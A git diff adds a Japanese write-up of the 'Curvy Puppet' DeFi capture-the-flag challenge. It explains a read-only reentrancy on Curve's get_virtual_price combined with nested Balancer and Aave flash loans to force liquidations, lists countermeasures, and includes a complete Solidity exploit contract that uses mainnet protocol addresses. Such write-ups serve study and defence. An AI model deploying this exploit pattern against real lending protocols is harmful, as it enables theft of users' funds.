@@ -452,3 +452,123 @@ by tinamints
     }
 }`
 
+
+
+## 17. Curvy Puppet
+### 条件 :
+- lendingコントラクト内の3ユーザー（alice/bob/charlie）のポジションをすべて閉じる（collateralもborrowも0にする）
+- treasuryはWETHとLPをいくらか残し、かつ3ユーザー分のDVT（7500）を最終的に持つこと
+- playerは最終的に何も残してはいけない
+### 概念 :
+-  read-only reentrancy（Curveの`get_virtual_price()`）
+-  借入資産の価格オラクル操作
+-  ネストしたフラッシュローン（Balancer + Aave）
+### 解法 :
+- lendingコントラクトは借入資産（Curve stETH/ETHのLPトークン）を`ETH_price * get_virtual_price()`で評価する。旧Curveプールの`remove_liquidity`はまずLP供給量をburnし、その後プール残高が確定する**前に**呼び出し元へrawコールでETHを送り返すため、そのETHコールバック中に`get_virtual_price()`が過大な値を読み取る（read-only reentrancy）。LPトークンはユーザーの*借入*資産なので、膨らんだLP価格が全員の負債価値を膨らませ、本来は過剰担保だった3つのポジションが清算可能になる。
+- 清算は`collateralValue*100 < borrowValue*175`で発動する。collateral = 2500 DVT（$10）、borrow = 1 LP なので、`virtual_price > 3.5714e18`まで押し上げる必要がある（通常は約1.1e18）。
+- 流れ：Balancer（外側・手数料0）とAave（内側）からWETH+wstETHをフラッシュローン → unwrap/withdrawでETH+stETHに変換 → 意図的にstETHを多めにした巨大な`add_liquidity`（spikeはstETH側に比例）→ `remove_liquidity` → ETHを受け取る`receive()`内ではvirtual_priceが跳ね上がっているので、3ユーザーを`liquidate()`する（treasuryの6.5 LPから1人あたり1 LPを支払い、1人あたり2500 DVTを受け取る）。
+- 返済：ETHが少ない預け入れだったため戻りはETH過多 / stETH不足になり、ほぼ同価値のETH余剰とwstETH不足が生じる。まず返すべきWETHを確保し、残りのETHをLido経由でstETHに変換（treasuryがWETHを残せるよう少額のreserveを残す）してwrapし、必要なwstETHをすべて賄う。主なコストはAaveの約0.05%手数料で、treasuryの200 WETHのクッションで吸収されるため、wstETHの借入は控えめにする。
+### 対策 :
+- 信頼できない呼び出し元へ制御が渡り得る状態で`get_virtual_price()`（やプールのstate）を読まない — 操作耐性のあるオラクルを使うか、viewをプールのreentrancy lockで保護する（Curveは後に`remove_liquidity`へreentrancy保護を追加した）。貸付資産を単一のスポットvirtual priceで評価しないこと。
+### POC
+` function test_curvyPuppet() public checkSolvedByPlayer {
+        Exploit exploit = new Exploit(
+            lending, curvePool, oracle, dvt, stETH, weth, treasury, [alice, bob, charlie]
+        );
+        weth.transferFrom(treasury, address(exploit), TREASURY_WETH_BALANCE);
+        IERC20(curvePool.lp_token()).transferFrom(treasury, address(exploit), TREASURY_LP_BALANCE);
+        exploit.run();
+    }`
+
+`contract Exploit {
+    IBalancerVault constant balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
+    address constant aavePool = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;
+    IWstETH constant wstETH = IWstETH(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0);
+    IPermit2 constant permit2 = IPermit2(0x000000000022D473030F116dDEE9F6B43aC78BA3);
+
+    // Balancer <= ~37,991 WETH / ~12,597 wstETH ; Aave <= ~83,192 WETH / ~1,036,780 wstETH
+    uint256 constant BAL_WETH   = 37_000e18;
+    uint256 constant BAL_WSTETH = 12_000e18;
+    // stETH多め: virtual_priceを ~3.5714e18（清算しきい値）の少し上まで押し上げる
+    uint256 constant AAVE_WETH   = 83_000e18;
+    uint256 constant AAVE_WSTETH = 140_000e18;
+    uint256 constant ETH_RESERVE = 20e18; // treasuryがWETH > 0で終わるよう残すETH
+
+    // ... immutables + lending/curvePool/oracle/dvt/stETH/weth/treasury/lpToken/users を保存するconstructor
+    enum State { NONE, LIQUIDATING }
+    State state;
+
+    function run() external {
+        // OUTER loan: Balancer（tokenは昇順: wstETH < WETH）
+        address[] memory tokens = new address[](2);
+        uint256[] memory amounts = new uint256[](2);
+        tokens[0] = address(wstETH); tokens[1] = address(weth);
+        amounts[0] = BAL_WSTETH;     amounts[1] = BAL_WETH;
+        balancer.flashLoan(address(this), tokens, amounts, "");
+
+        // すべてtreasuryへ返す
+        weth.deposit{value: address(this).balance}();
+        dvt.transfer(treasury, dvt.balanceOf(address(this)));            // 7500 DVT
+        weth.transfer(treasury, weth.balanceOf(address(this)));          // WETH > 0
+        IERC20(lpToken).transfer(treasury, IERC20(lpToken).balanceOf(address(this))); // LP > 0
+    }
+
+    function receiveFlashLoan(address[] memory, uint256[] memory, uint256[] memory, bytes memory) external {
+        require(msg.sender == address(balancer), "not balancer");
+        // INNER loan: Aave（両資産）, modes [0,0] = 全額返済
+        address[] memory assets = new address[](2);
+        uint256[] memory amts = new uint256[](2);
+        uint256[] memory modes = new uint256[](2);
+        assets[0] = address(weth);  assets[1] = address(wstETH);
+        amts[0] = AAVE_WETH;        amts[1] = AAVE_WSTETH;
+        (bool ok,) = aavePool.call(abi.encodeWithSignature(
+            "flashLoan(address,address[],uint256[],uint256[],address,bytes,uint16)",
+            address(this), assets, amts, modes, address(this), bytes(""), uint16(0)));
+        require(ok, "aave flashloan failed");
+        // Balancerへ返済（手数料なし）
+        IERC20(address(weth)).transfer(address(balancer), BAL_WETH);
+        IERC20(address(wstETH)).transfer(address(balancer), BAL_WSTETH);
+    }
+
+    function executeOperation(address[] calldata, uint256[] calldata, uint256[] calldata premiums,
+        address initiator, bytes calldata) external returns (bool) {
+        require(msg.sender == aavePool && initiator == address(this));
+        // 1) 借りたtokenをすべてプールのcoin（ETH + stETH）に変換
+        weth.withdraw(IERC20(address(weth)).balanceOf(address(this)));
+        wstETH.unwrap(IERC20(address(wstETH)).balanceOf(address(this)));
+        stETH.approve(address(curvePool), type(uint256).max);
+        // 2) 巨大な（stETH多めの）liquidityを追加
+        uint256 stEthAmount = stETH.balanceOf(address(this));
+        uint256 ethForLp = address(this).balance;
+        uint256 lpMinted = curvePool.add_liquidity{value: ethForLp}([ethForLp, stEthAmount], 0);
+        // 3) liquidate()時にlendingがLPを引けるようにする
+        IERC20(lpToken).approve(address(permit2), type(uint256).max);
+        permit2.approve(lpToken, address(lending), type(uint160).max, uint48(block.timestamp + 1));
+        // 4) remove -> プールがreceive()へrawコールでETH送付 -> 清算ウィンドウ
+        state = State.LIQUIDATING;
+        curvePool.remove_liquidity(lpMinted, [uint256(0), uint256(0)]);
+        state = State.NONE;
+        // 5) 返済: ETH余剰 -> stETH -> wstETH で不足分を補う
+        uint256 wethOwed   = AAVE_WETH + premiums[0] + BAL_WETH;
+        uint256 wstethOwed = AAVE_WSTETH + premiums[1] + BAL_WSTETH;
+        weth.deposit{value: wethOwed}();
+        uint256 ethBal = address(this).balance;
+        if (ethBal > ETH_RESERVE) {
+            (bool ok,) = address(stETH).call{value: ethBal - ETH_RESERVE}(
+                abi.encodeWithSignature("submit(address)", address(0)));
+            require(ok, "lido submit failed");
+        }
+        stETH.approve(address(wstETH), type(uint256).max);
+        wstETH.wrap(stETH.balanceOf(address(this)));
+        require(IERC20(address(wstETH)).balanceOf(address(this)) >= wstethOwed, "wsteth short");
+        IERC20(address(weth)).approve(aavePool, AAVE_WETH + premiums[0]);
+        IERC20(address(wstETH)).approve(aavePool, AAVE_WSTETH + premiums[1]);
+        return true;
+    }
+
+    receive() external payable {
+        if (state != State.LIQUIDATING) return;
+        // 今virtual_priceは膨張中（read-only reentrancy）-> 全ポジション清算可能
+        for (uint256 i = 0; i < users.length; i++) lending.liquidate(users[i]);
+    }
+}`
